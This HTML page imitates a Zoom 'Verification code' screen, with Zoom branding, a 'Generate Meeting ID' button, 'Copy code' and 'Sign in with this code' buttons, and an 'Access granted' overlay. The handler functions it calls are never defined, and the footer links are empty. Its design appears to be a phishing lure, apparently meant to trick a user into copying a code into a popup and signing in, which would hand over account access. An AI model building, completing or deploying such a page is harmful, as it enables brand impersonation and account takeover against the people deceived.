<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Zoom · Verification code</title>
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@300;400;500;600;700&display=swap" rel="stylesheet">
    <style>
        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
        :root { --sp-blue: #2D8CFF; --sp-blue-dark: #0b5cff; --sp-blue-light: #E8F4FC; --sp-navy: #232333; --sp-gray-2: #e1e6eb; --sp-gray-4: #717171; --sp-white: #FFFFFF; --sp-red: #D13438; --radius-md: 12px; --radius-xl: 16px; --shadow-card: 0 10px 30px rgba(0,0,0,.08); }
        
        body { font-family: 'Segoe UI', -apple-system, sans-serif; background: #eef2f6; min-height: 100vh; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px 16px; }

        .card { background: var(--sp-white); border-radius: var(--radius-xl); box-shadow: var(--shadow-card); border: 1px solid var(--sp-gray-2); width: 100%; max-width: 500px; overflow: hidden; position: relative; }
        .card::before { content: ''; position: absolute; top: 0; left: 0; right: 0; height: 4px; background: var(--sp-blue); }

        .card-header { padding: 36px 40px 10px; text-align: center; background: #FFFFFF; }
        
        /* Fixed to show only ONE combined logo layout matching the reference */
        .zoom-logo-container { display: flex; align-items: center; justify-content: center; margin-bottom: 24px; }
        .zoom-combined-img { height: 38px; width: auto; object-fit: contain; }

        .card-header h1 { font-size: 24px; font-weight: 700; color: var(--sp-navy); line-height: 1.3; margin-bottom: 10px; }
        .card-header p { font-size: 14px; color: var(--sp-gray-4); line-height: 1.5; max-width: 380px; margin: 0 auto; }
        
        .card-body { padding: 24px 40px 40px; }

        .btn-primary { width: 100%; padding: 14px 20px; background: var(--sp-blue); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 15px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 9px; transition: background .15s, transform .1s; box-shadow: 0 4px 12px rgba(45,140,255,0.25); margin-top: 16px; }
        .btn-primary:hover { background: var(--sp-blue-dark); }
        .btn-primary:active { transform: scale(.99); }
        
        .btn-secondary { width: 100%; padding: 13px 20px; background: transparent; color: var(--sp-navy); border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); font-family: inherit; font-size: 14px; font-weight: 600; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 8px; transition: all .15s; margin-bottom: 12px; }
        .btn-secondary:hover { border-color: var(--sp-blue); color: var(--sp-blue); background: var(--sp-blue-light); }

        .code-panel { display: none; margin-top: 0px; }
        .code-panel.show { display: block; }
        
        .code-box { background: #f8fafc; border: 1.5px solid var(--sp-gray-2); border-radius: var(--radius-md); padding: 18px 16px; text-align: center; }
        .code-placeholder { font-size: 14px; color: var(--sp-gray-4); font-weight: 400; padding: 6px 0; }
        .code-value { font-family: 'SF Mono', 'Roboto Mono', Consolas, monospace; font-size: 28px; font-weight: 700; letter-spacing: 8px; color: var(--sp-navy); user-select: all; }
        
        .timer-row { display: flex; align-items: center; justify-content: space-between; margin-top: 14px; }
        .timer-pill { display: inline-flex; align-items: center; gap: 6px; background: var(--sp-blue-light); color: var(--sp-blue); border-radius: 40px; padding: 5px 12px; font-size: 13px; font-weight: 600; }
        .timer-pill.expired { background: #FDE7E9; color: var(--sp-red); }
        
        .refresh-btn { background: none; border: none; cursor: pointer; color: var(--sp-blue); font-family: inherit; font-size: 13px; font-weight: 600; display: inline-flex; align-items: center; gap: 5px; padding: 5px 10px; border-radius: 4px; transition: background .12s; }
        .refresh-btn:hover { background: var(--sp-blue-light); }
        
        .action-row { display: flex; flex-direction: column; margin-top: 16px; }
        .sign-in-btn { width: 100%; background: linear-gradient(135deg, #2D8CFF, #0b5cff); color: #fff; border: none; border-radius: var(--radius-md); font-family: inherit; font-size: 15px; font-weight: 600; padding: 14px 12px; cursor: pointer; display: flex; align-items: center; justify-content: center; gap: 6px; transition: all .15s; box-shadow: 0 4px 12px rgba(45,140,255,0.25); }
        .sign-in-btn:hover { filter: brightness(1.05); transform: translateY(-1px); }
        
        .status-text { font-size: 12px; color: var(--sp-gray-4); text-align: center; margin-top: 14px; min-height: 18px; }
        .status-text.error { color: var(--sp-red); background: #FDE7E9; border-radius: 4px; padding: 8px 12px; }
        
        .divider { height: 1px; background: var(--sp-gray-2); margin: 30px 0 20px; }
        
        .footer-links { display: flex; justify-content: center; gap: 16px; font-size: 12px; color: var(--sp-gray-4); }
        .footer-links a { color: inherit; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }

        .overlay { display: none; position: fixed; inset: 0; background: rgba(20,30,45,.55); backdrop-filter: blur(3px); align-items: center; justify-content: center; z-index: 100; }
        .overlay.show { display: flex; }
        .overlay-card { background: var(--sp-white); border-radius: var(--radius-xl); padding: 44px 40px 40px; text-align: center; width: 320px; box-shadow: 0 20px 48px rgba(0,0,0,.18); }
        .check-wrap { width: 60px; height: 60px; background: #E6F9EE; border-radius: 50%; display: flex; align-items: center; justify-content: center; margin: 0 auto 20px; }
        .overlay-card h3 { font-size: 20px; font-weight: 700; color: var(--sp-navy); margin-bottom: 8px; }
        .overlay-card p { font-size: 13px; color: var(--sp-gray-4); line-height: 1.55; }
        
        @media(max-width:480px){.card-header,.card-body{padding-left:24px;padding-right:24px}}
    </style>
</head>
<body>

    <div class="card">
        <div class="card-header">
            <!-- Single clean vector logo with icon + text combined seamlessly -->
            <div class="zoom-logo-container">
                <img class="zoom-combined-img" src="https://www.vectorlogo.zone/logos/zoomus/zoomus-ar21.svg" alt="Zoom">
            </div>
            <h1>Verification code</h1>
            <p>To verify your identity, enter the 6-character code below to connect to your account.</p>
        </div>

        <div class="card-body">
            <!-- Initial state container showing placeholder and Generate Meeting ID button -->
            <div id="initialStateBox">
                <div class="code-box">
                    <div class="code-placeholder">Your verification code will appear here</div>
                </div>
                <button class="btn-primary" id="startBtn" onclick="generateCode()">
                    Generate Meeting ID
                </button>
            </div>

            <!-- Active code panel revealed upon generation -->
            <div class="code-panel" id="codePanel">
                <div class="code-box">
                    <div class="code-value" id="codeValue">------</div>
                </div>

                <div class="timer-row">
                    <div class="timer-pill" id="timerPill">Verification code expires in --:--</div>
                    <button class="refresh-btn" id="refreshBtn" onclick="refreshCode()">
                        Get new code
                    </button>
                </div>

                <div class="action-row" id="actionRow">
                    <button class="btn-secondary" id="copyBtn" onclick="copyAndOpenPopup()">
                        <svg width="15" height="15" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        Copy code
                    </button>
                    <button class="sign-in-btn" id="signInBtn" onclick="verifyWithCopy()">
                        Sign in with this code
                    </button>
                </div>
                <div class="status-text" id="statusMsg"></div>
            </div>

            <div class="divider"></div>
            
            <div class="footer-links">
                <a href="#">Privacy</a>
                <span>·</span>
                <a href="#">Terms</a>
                <span>·</span>
                <a href="#">Support</a>
            </div>
        </div>
    </div>

    <div class="overlay" id="overlay">
        <div class="overlay-card">
            <div class="check-wrap"><svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="#0B6A0B" stroke-width="2.5" stroke-linecap="round"><polyline points="20 6 9 17 4 12"/></svg></div>
            <h3>Access granted</h3>
            <p>Identity verified.<br>Redirecting to your content…</p>
        </div>
    </div>
</body>
</html>
